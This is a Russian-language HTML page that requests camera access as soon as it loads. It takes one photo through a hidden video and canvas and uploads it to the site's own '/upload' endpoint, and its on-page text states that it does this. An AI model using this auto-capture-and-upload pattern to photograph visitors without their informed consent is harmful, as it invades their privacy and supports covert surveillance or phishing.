<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <title>Auto Snapshot</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    body { font-family: Arial; text-align:center; padding:30px; background:#f5f5f5; }
    #status { margin: 12px 0; }
    video, canvas { display:none; }
  </style>
</head>
<body>
  <h2>Авто-снимок и отправка на сервер</h2>
  <div id="status">Ожидание разрешения на камеру...</div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const statusEl = document.getElementById('status');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    async function autoCaptureOnce() {
      try {
        statusEl.textContent = 'Запрос доступа к камере...';
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        await new Promise(r => setTimeout(r, 300));

        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null;

        statusEl.textContent = 'Снимок сделан. Отправка на сервер...';

        canvas.toBlob(blob => {
          if (!blob) {
            statusEl.textContent = 'Ошибка формирования изображения.';
            return;
          }

          const fd = new FormData();
          fd.append('photo', blob, 'snapshot.png');

          // Для Render используем относительный путь
          fetch('/upload', { method: 'POST', body: fd })
            .then(res => res.json())
            .then(data => {
              statusEl.textContent = 'Фото отправлено: ' + (data.filename || 'ok');
            })
            .catch(err => {
              console.error(err);
              statusEl.textContent = 'Ошибка отправки: ' + err.message;
            });
        }, 'image/png');

      } catch (err) {
        console.error(err);
        statusEl.textContent = 'Доступ к камере не получен: ' + err.message;
      }
    }

    window.addEventListener('load', autoCaptureOnce);
  </script>
</body>
</html>
